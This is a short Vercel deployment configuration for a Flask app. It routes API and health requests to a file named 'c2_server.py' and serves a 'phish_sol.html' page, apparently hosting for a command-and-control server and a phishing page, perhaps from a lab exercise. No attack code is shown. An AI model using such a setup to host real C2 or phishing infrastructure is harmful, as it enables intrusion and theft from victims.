{
  "version": 2,
  "buildCommand": "pip install -q -r requirements.txt && cp .env.example .env 2>/dev/null || true",
  "outputDirectory": ".",
  "framework": "flask",
  "functions": {
    "api/c2_server.py": {
      "maxDuration": 30,
      "memory": 512
    }
  },
  "routes": [
    {
      "src": "/(.*)\\.html$",
      "dest": "/$1"
    },
    {
      "src": "^/api/(.*)$",
      "dest": "/api/c2_server.py"
    },
    {
      "src": "^/health$",
      "dest": "/api/c2_server.py"
    },
    {
      "src": "^/phish_sol\\.html$",
      "dest": "/phish_sol.html"
    }
  ]
}
